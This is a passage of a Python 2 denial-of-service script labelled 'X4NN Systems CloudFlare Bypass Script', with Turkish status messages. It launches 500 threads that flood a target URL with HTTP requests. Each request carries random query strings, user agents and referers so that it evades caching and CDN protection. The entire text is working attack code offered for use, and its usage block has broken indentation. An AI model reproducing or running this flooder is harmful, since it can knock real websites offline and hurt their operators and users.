  headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
  headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
  headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
  return(headers_useragents)

# generates a referer array
def referer_list():
  global headers_referers
  headers_referers.append('http://www.google.com/?q=')
  headers_referers.append('http://www.usatoday.com/search/results?q=')
  headers_referers.append('http://engadget.search.aol.com/search?q=')
  headers_referers.append('http://' + host + '/')
  return(headers_referers)
  
#builds random ascii string
def buildblock(size):
  out_str = ''
  for i in range(0, size):
    a = random.randint(65, 90)
    out_str += chr(a)
  return(out_str)

def usage():
  print '---------------------------------------------------'
  print 'USAGE: python x4nncfbypass.py <url>'
  print 'X4NN Systems website : X4NN.COM'
  print "\a"
print \
"""
                   ...
                 ;::::;   Saldiri Baslamistir...                             
"""
print '---------------------------------------------------'

  
#http request
def httpcall(url):
  useragent_list()
  referer_list()
  code=0
  if url.count("?")>0:
    param_joiner="&"
  else:
    param_joiner="?"
  request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
  request.add_header('User-Agent', random.choice(headers_useragents))
  request.add_header('Cache-Control', 'no-cache')
  request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
  request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
  request.add_header('Keep-Alive', random.randint(110,120))
  request.add_header('Connection', 'keep-alive')
  request.add_header('Host',host)
  try:
      urllib2.urlopen(request)
  except urllib2.HTTPError, e:
      #print e.code
      set_flag(1)
      print 'X4NN Systems Tarafindan Tasarlanmis [+]CloudFlare Bypass Script'
      code=1
  except urllib2.URLError, e:
      #print e.reason
      sys.exit()
  else:
      inc_counter()
      urllib2.urlopen(request)
  return(code)    

  
#http caller thread 
class HTTPThread(threading.Thread):
  def run(self):
    try:
      while flag<2:
        code=httpcall(url)
        if (code==500) & (safe==1):
          set_flag(2)
    except Exception, ex:
      pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
  def run(self):
    previous=request_counter
    while flag==0:
      if (previous+100<request_counter) & (previous<>request_counter):
        print "%d Shots sends Senting" % (request_counter)
        previous=request_counter
    if flag==2:
      print "\n -M60 Hits are secced"

#execute 
if len(sys.argv) < 2:
  usage()
  sys.exit()
else:
  if sys.argv[1]=="help":
    usage()
    sys.exit()
  else:
    print "X4NN Systems Tarafindan Tasarlanmis [+]CloudFlare Bypass Script"
    if len(sys.argv)== 3:
      if sys.argv[2]=="safe":
        set_safe()
    url = sys.argv[1]
    if url.count("/")==2:
      url = url + "/"
    m = re.search('http\://([^/]*)/?.*', url)
    host = m.group(1)
    for i in range(500):
      t = HTTPThread()
      t.start()
    t = MonitorThread()
    t.start()